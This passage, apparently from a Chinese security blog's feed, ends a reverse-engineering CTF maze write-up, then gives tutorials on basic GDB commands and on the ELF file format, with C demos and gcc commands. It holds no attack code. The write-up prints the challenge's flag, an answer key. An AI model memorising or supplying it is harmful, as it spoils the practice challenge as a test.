v10[0]]</code>中的值正好等于”#”，</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/43.png"></p><p>查看前面的流程，看到对于上面这个数组的位移来说，输入<code>O</code>是-1，<code>o</code>是+1，<code>.</code>是-8，<code>0</code>是+8</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/44.png"></p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/45.png"></p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/46.png"></p><p>此数组，也就是说是一个8*8的迷宫，需要走到”#”的位置。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/47.png"></p><p>如图中这样的迷宫，这样走可以走到“#”，然后带入前面的几个走的字符，得到flag</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/48.png"></p><blockquote><p>nctf{o0oo00O000oooo..OO}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Hello-CTF&quot;&gt;&lt;a href=&quot;#Hello-CTF&quot; class=&quot;headerlink&quot; title=&quot;Hello CTF&quot;&gt;&lt;/a&gt;Hello CTF&lt;/h2&gt;&lt;h3 id=&quot;详细分析&quot;&gt;&lt;a href=&quot;#详细分析&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="攻防世界writeup" scheme="https://b1ackie.cn/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwriteup/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CTF" scheme="https://b1ackie.cn/tags/CTF/"/>
    
    <category term="RE" scheme="https://b1ackie.cn/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>GDB学习--基本操作</title>
    <link href="https://b1ackie.cn/2021/10/29/GDB%E6%93%8D%E4%BD%9C/"/>
    <id>https://b1ackie.cn/2021/10/29/GDB%E6%93%8D%E4%BD%9C/</id>
    <published>2021-10-29T08:51:33.000Z</published>
    <updated>2021-11-03T06:38:09.851Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下学习GDB的一些东西，也不是所有的完全指令，主要还是一些日常用的。</p><p>在这里记录了一些比较全的命令，随时可以查看这里</p><p><a href="https://github.com/evilpan/awesome-cheatsheets/blob/master/tools/gdb.txt">https://github.com/evilpan/awesome-cheatsheets/blob/master/tools/gdb.txt</a></p><h2 id="GDB的一些命令"><a href="#GDB的一些命令" class="headerlink" title="GDB的一些命令"></a>GDB的一些命令</h2><p>先写一个小DEMO用来后面的GDB调试</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x,<span class="hljs-keyword">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> x+y;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> x=<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">int</span> y=<span class="hljs-number">5</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sum is %d\n&quot;</span>,<span class="hljs-built_in">add</span>(x,y));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>输入命令gdb，就可以打开gdb了，如图是gdb的界面。</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/1.png"></p><p>先列出一些gdb的常用指令。</p><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>run-r</td><td>运行程序，如果碰到断点的话就会停下来</td></tr><tr><td>break-b</td><td>设置断点</td></tr><tr><td>help-h</td><td>帮助菜单</td></tr><tr><td>step-s</td><td>单步步进，就是OD里的F7</td></tr><tr><td>next-n</td><td>单步步过，也就是OD里的F8</td></tr><tr><td>finish-fin</td><td>执行程序直到指定的栈帧返回，也就是调用了一个函数，执行到retn再执行retn</td></tr><tr><td>print-p</td><td>打印一些信息</td></tr><tr><td>quit-q</td><td>退出</td></tr></tbody></table><h2 id="GDB操作"><a href="#GDB操作" class="headerlink" title="GDB操作"></a>GDB操作</h2><p>打开gdb之后，输入file + 文件名 即可将文件附加进去。</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/2.png"></p><p>输入<code>start</code>命令可以停在main函数处，与<code>run</code>命令的区别是，后者是运行碰到断点停下，前者是停在main函数处。</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/3.png"></p><h3 id="断点类"><a href="#断点类" class="headerlink" title="断点类"></a>断点类</h3><p><code>break</code>指令可以下断点，快捷是b，不带任何参数时，是在所选栈帧中执行的下一条指令处下断。</p><p><code>b func</code>：对函数下断，如图对main和add函数下断。</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/4.png"></p><p><code>b line</code>：在当前源代码的指定行下断。</p><p><code>b file:line</code>：在源码文件的line行处下断。</p><p><code>b file:function</code>：在源码文件的function处下断。</p><p><code>b *addr</code>：在程序指定地址处下断。</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/5.png"></p><p><code>info breakpoints</code>：可以列出当前所有的断点信息，快捷<code>i b</code></p><p><code>delete num</code>：删除指定编号的断点。</p><p><code>clear function</code>：删除指定函数的断点</p><p><code>delete</code>：删除所有断点</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/6.png"></p><h3 id="运行类"><a href="#运行类" class="headerlink" title="运行类"></a>运行类</h3><p><code>run</code>：运行程序</p><p><code>run args</code>：以某参数运行程序</p><p><code>set args (args)</code>：设置参数</p><p><code>show args</code>：查看当前的运行参数</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/7.png"></p><p><code>step</code>：单步步入，碰到函数会进入，就是OD中的F7。</p><p><code>step count</code>：单步conut次</p><p><code>next</code>：单步步过，OD中的F8</p><p><code>next count</code>：单步count次</p><p><code>finish</code>：结束当前函数的运行</p><p><code>kill</code>：杀死当前运行的函数</p><h3 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h3><p><code>bt</code>：打印当前backtrace</p><p><code>frame</code>：显示当前运行的栈帧</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/8.png"></p><h3 id="浏览数据"><a href="#浏览数据" class="headerlink" title="浏览数据"></a>浏览数据</h3><p><code>print expression</code> ：打印表达式，可以简写为p</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/9.png"></p><p><code>p /x expression</code>：十六进制输出</p><p><code>p /x $寄存器</code>：十六进制打印寄存器的值</p><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/10.png"></p><p><code> x/&lt;n/f/u&gt; &lt;addr&gt;</code>：打印指定地址的内存数据，其中n是一个正整数，表示显示内存的长度；f是显示的格式，字符串可以是s，指令地址可以用i；u表示从当前地址往后请求的字节数，不指定的话默认是4字节，b代表单字节，w表示4字节，g表示8字节。</p><p>输出格式：</p><ul><li>x 按十六进制格式显示变量；</li><li>d 按十进制格式显示变量；</li><li>u 按十六进制格式显示无符号整型；</li><li>o 按八进制格式显示变量；</li><li>t 按二进制格式显示变量；</li><li>a 按十六进制格式显示变量；</li><li>c 按字符格式显示变量；</li><li>f 按浮点数格式显示变量。</li></ul><p><img src="/2021/10/29/GDB%E6%93%8D%E4%BD%9C/11.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;记录一下学习GDB的一些东西，也不是所有的完全指令，主要还是一些日常用的。&lt;/p&gt;
&lt;p&gt;在这里记录了一些比较全的命令，随时可以查看这里&lt;/</summary>
      
    
    
    
    <category term="学习记录" scheme="https://b1ackie.cn/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="GDB" scheme="https://b1ackie.cn/tags/GDB/"/>
    
  </entry>
  
  <entry>
    <title>elf文件格式</title>
    <link href="https://b1ackie.cn/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    <id>https://b1ackie.cn/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</id>
    <published>2021-10-26T09:49:49.000Z</published>
    <updated>2021-12-06T05:37:57.925Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF文件格式"><a href="#ELF文件格式" class="headerlink" title="ELF文件格式"></a>ELF文件格式</h2><p>elf文件，Executable and Linking Format，“可执行可连接格式”，具有这种格式的文件称为elf文件。</p><p>在elf规范中，把elf文件宽泛的称为“目标文件（Object File）”，这与我们通常理解的“.o”文件不同，elf文件仅指连接好的可执行文件。对于“.o”文件，可以直接称为可重定位文件。</p><p>elf文件主要分为三种类型：</p><ul><li>可重定位文件（relocatable file）：由源文件编译而成且尚未链接的目标文件，通常以“.o”作为扩展名，用于与其他目标文件进行连接以构建可执行文件或动态链接库，通常是一段位置独立的代码。</li><li>共享目标文件（shared object file）：动态链接库文件。用于在链接过程中与其他动态链接库或可重定位文件一起构建新的目标文件，或者在可执行文件加载时，链接到进程中作为运行代码的一部分。</li><li>可执行文件（executable file）：经过链接的、可执行的目标文件，通常也被称为程序。</li></ul><p>目标文件的作用有两个，一是用于构建程序，构建动态链接库或可执行程序；二是用于运行程序。所以有两种视角来看待一个程序，链接视角，通过节来进行划分，另一种是运行视角，通过段来进行划分。</p><table><thead><tr><th>链接视角</th><th>运行视角</th></tr></thead><tbody><tr><td>ELF文件头</td><td>ELF文件头</td></tr><tr><td>程序头表（可选）</td><td>程序头表</td></tr><tr><td>第一节</td><td></td></tr><tr><td>第二节</td><td>第一段</td></tr><tr><td>…</td><td>…</td></tr><tr><td>第N节</td><td>第N段</td></tr><tr><td>节头表</td><td>段头表（可选）</td></tr></tbody></table><p>这里使用的示例程序</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> global_init_var = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">int</span> global_uninit_var;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sum)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,sum);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> local_static_init_var = <span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> local_static_uninit_var;<br><br>    <span class="hljs-keyword">int</span> local_init_var = <span class="hljs-number">30</span>;<br>    <span class="hljs-keyword">int</span> local_uninit_var ;<br><br>    func(global_init_var + local_init_var + local_static_init_var);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>执行下面四个命令，可以分别生成前面说过的几种文件</p><blockquote><p>gcc elfDemo.c -o elfDemo.exec<br>gcc -static elfDemo.c -o elfDemo_static.exec<br>gcc -c elfDemo.c -o elfDemo.rel<br>gcc -c -fPIC elfDemo.c -o elfDemo_pic.rel &amp;&amp; gcc -shared elfDemo_pic.rel -o elfDemo.dyn</p></blockquote><p>使用file命令查看，可以看到它们的类型</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/1.png"></p><h3 id="elf文件头"><a href="#elf文件头" class="headerlink" title="elf文件头"></a>elf文件头</h3><p>elf文件头位于目标文件最开始的位置，包含描述整个文件的一些基本信息，比如elf文件类型、版本、目标机器、程序入口等。</p><p>如图可以看到elfDemo.rel文件头的一些信息。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/2.png"></p><p>Elf64_Ehdr结构体如下所示：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> e_ident[EI_NIDENT];   <span class="hljs-comment">//elf标志</span><br>    Elf64_Half      e_type;             <span class="hljs-comment">//文件类型</span><br>    Elf64_Half      e_machine;          <span class="hljs-comment">//该文件适用的处理器体系结构</span><br>    Elf64_Word      e_version;          <span class="hljs-comment">//目标文件版本</span><br>    Elf64_Addr      e_entry;            <span class="hljs-comment">//程序入口的虚拟地址</span><br>    Elf64_Off       e_phoff;            <span class="hljs-comment">//程序头表开始处在文件中的偏移</span><br>    Elf64_Off       e_shoff;            <span class="hljs-comment">//节头表开始处在文件中的偏移</span><br>    Elf64_Word      e_flags;            <span class="hljs-comment">//处理器特定的标志位</span><br>    Elf64_Half      e_ehsize;           <span class="hljs-comment">//elf文件头的大小</span><br>    Elf64_Half      e_phentsize;        <span class="hljs-comment">//程序头表中表项大小</span><br>    Elf64_Half      e_phnum;            <span class="hljs-comment">//程序头表中表项数</span><br>    Elf64_Half      e_shentsize;        <span class="hljs-comment">//节头表中表项大小</span><br>    Elf64_Half      e_shnum;            <span class="hljs-comment">//节头表表项数</span><br>    Elf64_Half      e_shstrndx          <span class="hljs-comment">//节头表与节名字表对应的表项索引</span><br>&#125;Elf64_Ehdr;<br></code></pre></div></td></tr></table></figure><h3 id="节"><a href="#节" class="headerlink" title="节"></a>节</h3><p>一个目标文件包含许多节，这些节的信息保存在节头表中，表的每一项都是Elf64_Shdr结构体，记录了节的名字、长度、偏移等信息。节头表的位置记录在文件头的e_shoff域中。节头表对于程序运行不是必须的，</p><p>elfDemo.rel的节头表如下所示：</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/3.png"></p><p>Elf64_Shdr结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Word      sh_name;        <span class="hljs-comment">//节的名字，只是一个索引号</span><br>    Elf64_Word      sh_type;        <span class="hljs-comment">//节类型</span><br>    Elf64_Xword     sh_flags;       <span class="hljs-comment">//节属性</span><br>    Elf64_Addr      sh_addr;        <span class="hljs-comment">//映射的起始地址</span><br>    Elf64_Off       sh_offset;      <span class="hljs-comment">//相对于文件开头的偏移量</span><br>    Elf64_Xword     sh_size;        <span class="hljs-comment">//节的大小，单位是字节</span><br>    Elf64_Word      sh_link;        <span class="hljs-comment">//索引值，指向节头表中本节所对应的位置</span><br>    Elf64_Word      sh_info;        <span class="hljs-comment">//节的附加信息</span><br>    Elf64_Xword     sh_addralign;   <span class="hljs-comment">//节的对齐信息</span><br>    Elf64_Xword     sh_entsize;     <span class="hljs-comment">//指定每一个表项的大小</span><br>&#125;Elf64_Shdr;<br></code></pre></div></td></tr></table></figure><p>下面来分别看看示例程序elfDemo.rel的.text节.data节和.bss节。</p><p>首先是.text节，Contents of section中从左到右依次是偏移，数据，以及十六进制形式。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/4.png"></p><p>Disassembly of section则是反汇编的结果</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/5.png"></p><p>接下来看数据节和只读数据节。可以看到在.data中保存着0a000000和14000000而它们分别是int global_init_var和static int local_static_init_var（0xa=10，0x14=20）。</p><p>.rodata保存只读数据，包括只读变量和字符串常量。源码中调用printf用了“%d\n”，这是一种只读数据，保存在.rodata中。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/6.png"></p><p>BSS节用于保存未初始化的全局变量和局部静态变量。可以看到它并没有CONTENTS属性，表示该节在文件中实际上不存在，只是为了变量预留位置。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/7.png"></p><p>其他一些常见的节</p><table><thead><tr><th>节名</th><th>说明</th></tr></thead><tbody><tr><td>.comment</td><td>版本控制信息，如编译器版本</td></tr><tr><td>.debug_XXX</td><td>DWARF格式的调试信息</td></tr><tr><td>.strtab</td><td>字符串表</td></tr><tr><td>.shstrtab</td><td>节名的字符串表</td></tr><tr><td>.symtab</td><td>符号表</td></tr><tr><td>.dynamic</td><td>ld.so使用的动态链接信息</td></tr><tr><td>.dynstr</td><td>动态链接的字符串表</td></tr><tr><td>.dynsym</td><td>动态链接的符号表</td></tr><tr><td>.got</td><td>全局偏移量表，用于保存全局变量引用的地址</td></tr><tr><td>.got.plt</td><td>全局偏移量表，用于保存函数引用的地址</td></tr><tr><td>.plt</td><td>过程链接表，用于延迟绑定</td></tr><tr><td>.hash</td><td>符号哈希表</td></tr><tr><td>.rela.dyn</td><td>变量的动态重定位表</td></tr><tr><td>.rela.plt</td><td>函数的动态重定位表</td></tr><tr><td>.rel.text/rela.text</td><td>静态重定位表</td></tr><tr><td>.rel.XXX/rela.XXX</td><td>其他节的静态重定位表</td></tr><tr><td>.note.XXX</td><td>额外的编译信息</td></tr><tr><td>.eh_frame</td><td>用于操作异常的frame unwind信息</td></tr><tr><td>.init/.fini</td><td>程序初始化和终止的代码</td></tr></tbody></table><h4 id="字符串表"><a href="#字符串表" class="headerlink" title="字符串表"></a>字符串表</h4><p>字符串表包含了以NULL结尾的字符序列，用来表示符号名和节名，引用字符串时只需要给出字符序列在表中的偏移即可。字符串表的第一个字符和最后一个字符都是NULL字符，确保所有字符串的开始和终止。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/8.png"></p><h4 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h4><p>符号表记录了目标文件中所用到的所有符号信息，通常分为.dynsym和.symtab。.dynsym保存了引用自外部文件的符号，只能在运行时被解析，而.symtab还保存了本地符号，用于调试和链接。目标文件通过一个符号在表中的索引值来使用该符号。索引值从0开始计数，但值为0的表项不具有实际的意义，它表示未定义的符号。每个符号都有一个符号值，对于变量和函数，该值就是符号的地址。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/9.png"></p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Word      st_name;        <span class="hljs-comment">//符号名字</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>   st_info;        <span class="hljs-comment">//符号类型和属性</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>   st_other;       <span class="hljs-comment">//暂未使用</span><br>    Elf64_Section   st_shndx;       <span class="hljs-comment">//节索引</span><br>    Elf64_Addr      st_value;       <span class="hljs-comment">//符号值</span><br>    Elf64_Xword     st_size;        <span class="hljs-comment">//符号大小</span><br>&#125;Elf64_Sym;<br></code></pre></div></td></tr></table></figure><h4 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h4><p>重定位是把符号引用与符号定义连接在一起的过程。我们在编写程序的过程中，我们只需要写入要调用的函数名（即符号引用），在重定位的过程中，函数名会与实际的函数所在地址联系起来，让程序知道应该跳转到哪里去。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/10.png"></p><p>Elf64_Rel和Elf64_Rela的结构体如下所示。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Addr      r_offset;       <span class="hljs-comment">//重定位时需要被修改的符号的偏移</span><br>    Elf64_Xword     r_info;         <span class="hljs-comment">//重定位类型和符号索引</span><br>&#125;Elf64_Rel;<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Addr      r_offset;       <span class="hljs-comment">//重定位时需要被修改的符号的偏移</span><br>    Elf64_Xword     r_info;         <span class="hljs-comment">//重定位类型和符号索引</span><br>    Elf64_Sword     r_addend;       <span class="hljs-comment">//做偏移调整</span><br>&#125;Elf64_Rela;<br></code></pre></div></td></tr></table></figure><h3 id="可执行文件的装载"><a href="#可执行文件的装载" class="headerlink" title="可执行文件的装载"></a>可执行文件的装载</h3><p>刚才了解了目标文件的链接视角，下面将从运行视角来看一下。当运行一个程序的时候，首先要将该文件和动态链接库装载到进程空间中，形成一个进程镜像。每一个进程都拥有独立的虚拟地址空间，这个空间的布局是由记录在段头表中的程序头决定的。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/11.png"></p><p>可以看到每个段都包含了一个或者多个节，相当于是对这些节进行了分组，段的出现也正是出于此目的。随着节的数量增多，在进行内存映射的时候就产生了空间和资源浪费的问题。实际上，系统并不关心每个节的实际内容，而是关心这些节的权限，通过将不同权限的节分组，即可同时装载多个节，从而节省资源。</p><p>下面简要的讲解几个段。</p><p>通常一个可执行文件至少要有一个PT_LOAD类型的段，用于描述可装载的节，而动态链接的可执行文件则包含两个，将.data和.text分开存放。动态段PT_DYNAMIC包含了一些动态链接所必须的信息，如共享库列表、GOT表等。PT_NOTE类型的段保存了系统相关的附加信息。PT_INTERP段将位置和大小信息存放在一个字符串中，是对程序解释器位置的描述。PT_PHDR段保存了程序头表本身的位置和大小。</p><p>Elf64_Phdr结构如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Word      p_type;     <span class="hljs-comment">//段类型</span><br>    Elf64_Word      p_flags;    <span class="hljs-comment">//段属性</span><br>    Elf64_Off       p_offset;   <span class="hljs-comment">//段开头偏移量</span><br>    Elf64_Addr      p_vaddr;    <span class="hljs-comment">//段开始位置的虚拟地址</span><br>    Elf64_Addr      p_paddr;    <span class="hljs-comment">//段开始的物理空间</span><br>    Elf64_Xword     p_filesz;   <span class="hljs-comment">//段在文件中的大小</span><br>    Elf64_Xword     p_memsz;    <span class="hljs-comment">//段在内容镜像中的大小</span><br>    Elf64_Xword     p_align;    <span class="hljs-comment">//段对齐</span><br>&#125;Elf64_Phdr;<br></code></pre></div></td></tr></table></figure><h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><h4 id="地址空间的分配"><a href="#地址空间的分配" class="headerlink" title="地址空间的分配"></a>地址空间的分配</h4><p>链接由链接器完成，根据发生的时间不同，可以分为编译时链接、加载时链接和运行时链接。</p><p>重新写两个示例文件,main.c和func.c.</p><p><code>main.c</code></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> shared;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a,<span class="hljs-keyword">int</span> *b)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a = <span class="hljs-number">100</span>;<br>    func(&amp;a,&amp;shared);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><code>func.c</code></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">int</span> shared = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">int</span> tmp=<span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a,<span class="hljs-keyword">int</span> *b)</span></span><br><span class="hljs-function"></span>&#123;<br>    tmp = *a;<br>    *a = *b;<br>    *b = tmp;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用如下命令进行编译</p><figure class="highlight autoit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autoit">gcc -<span class="hljs-keyword">static</span> -fno-stack-protector main.c <span class="hljs-keyword">func</span>.c -save-temps --verbose -o <span class="hljs-keyword">func</span>.ELF<br></code></pre></div></td></tr></table></figure><p><img 